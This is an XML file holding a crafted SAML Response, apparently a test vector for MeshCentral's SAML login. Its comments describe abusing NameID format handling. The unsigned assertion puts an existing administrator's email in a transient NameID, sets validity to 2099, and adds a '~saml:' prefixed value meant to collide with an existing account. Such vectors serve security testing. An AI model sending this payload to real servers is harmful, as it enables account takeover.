<?xml version="1.0" encoding="UTF-8"?>
<!-- VECTOR: nameID format variants — transient vs persistent vs unspecified; MeshCentral uses nameID value regardless of Format, may collide with existing users -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_format001"
                Version="2.0"
                IssueInstant="2026-01-01T00:00:00Z"
                Destination="https://meshcentral.example.com/auth-saml-callback">
  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <!-- Assertion 1: transient format — value set to an existing admin's email -->
  <saml:Assertion ID="_assertion_transient" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">admin@corp.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>meshcentral</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <!-- Unspecified format with MeshCentral's internal SID prefix to collide with existing account -->
      <saml:Attribute Name="nameID">
        <saml:AttributeValue Format="urn:oasis:names:tc:SAML:2.0:nameid-format:unspecified">~saml:admin@corp.com</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
